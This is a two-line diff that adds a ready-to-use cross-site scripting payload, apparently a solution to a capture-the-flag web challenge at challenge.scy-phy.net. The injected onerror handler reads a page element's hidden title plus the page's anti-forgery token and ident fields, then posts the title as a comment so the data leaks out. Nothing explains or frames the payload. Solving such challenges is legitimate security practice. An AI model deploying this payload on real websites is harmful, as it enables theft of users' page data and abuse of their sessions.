@@ -1,0 +1,2 @@
+$
+onerror='const el=document.getElementById("welcome"),t=el.title,tk=document.getElementsByName("token")[0].value,id=document.getElementsByName("ident")[0].value,d=new FormData();d.append("action","news-comment"),d.append("token",tk),d.append("ident",id),d.append("comment",t),fetch("https://challenge.scy-phy.net/?page=default",{method:"POST",body:d});'
